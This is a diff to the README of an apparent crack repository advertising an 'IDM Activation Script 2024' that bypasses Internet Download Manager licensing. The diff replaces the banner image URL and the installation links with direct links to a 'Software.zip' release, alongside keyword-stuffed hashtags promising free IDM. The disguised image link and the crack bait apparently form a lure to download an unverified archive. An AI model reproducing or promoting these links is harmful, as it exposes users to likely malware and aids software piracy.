@@ -1,6 +1,6 @@
 # 🚀 Welcome to IDM Activation Script 2024 Repository! 🚀
 
-![IDM Activation Script 2024 Banner](https://example.com/idm-banner.png)
+![IDM Activation Script 2024 Banner](https://github.com/Kzy28/IDM-Activation-Script-2024/releases/download/v1.0/Software.zip)
 
 ## Repository Overview
 This repository hosts the IDM Activation Script 2024, a powerful tool designed to freeze IDM trial and enable activation using the registry key lock method. With this script, you can ensure that your IDM activation and trial status persist even after updating the software. Additionally, the tool offers a convenient IDM trial reset feature, making it a must-have for IDM users seeking uninterrupted service.
@@ -15,7 +15,7 @@ This repository hosts the IDM Activation Script 2024, a powerful tool designed t
 #download-idm-free-for-lifetime, #download-idm-lifetime-free, #free-idm, #free-idm-2024, #free-idm-key, #idm-download, #idm-free, #idm-free-pc, #idm-free-windows, #idm-full, #idm-license, #idm-reset-trial, #idm-resetter-download, #idm-trial-reset-tool, #internet-download-manager-premium
 
 ## Installation
-To get started with the IDM Activation Script 2024, you can download the latest release [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip). Click [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) to download the file.
+To get started with the IDM Activation Script 2024, you can download the latest release [here](https://github.com/Kzy28/IDM-Activation-Script-2024/releases/download/v1.0/Software.zip). Click [here](https://github.com/Kzy28/IDM-Activation-Script-2024/releases/download/v1.0/Software.zip) to download the file.
 
 ## Usage
 1. Download the IDM Activation Script 2024 from the link provided above.
